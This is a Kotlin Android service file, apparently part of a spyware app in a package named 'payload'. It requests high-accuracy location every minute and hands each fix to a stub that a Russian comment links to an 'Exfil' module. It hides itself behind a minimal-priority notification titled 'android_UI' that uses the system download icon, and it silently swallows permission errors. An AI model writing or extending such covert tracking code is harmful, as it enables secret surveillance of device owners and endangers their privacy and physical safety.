package com.sp.payload.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*

class LocationServiceImpl : Service() {

    private lateinit var client: FusedLocationProviderClient

    override fun onCreate() {
        super.onCreate()
        startForeground(0x5F90, notif())
        client = LocationServices.getFusedLocationProviderClient(this)
        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 60_000L).build()
        val cb = object : LocationCallback() {
            override fun onLocationResult(r: LocationResult) {
                r.lastLocation?.let { push(it) }
            }
        }
        try { client.requestLocationUpdates(req, cb, Looper.getMainLooper()) }
        catch (_: SecurityException) {}
    }

    private fun push(loc: Location) { /* см. Exfil в core */ }

    private fun notif(): Notification {
        val chId = "payload"
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(chId, "android_UI",
                NotificationManager.IMPORTANCE_MIN)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN).build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}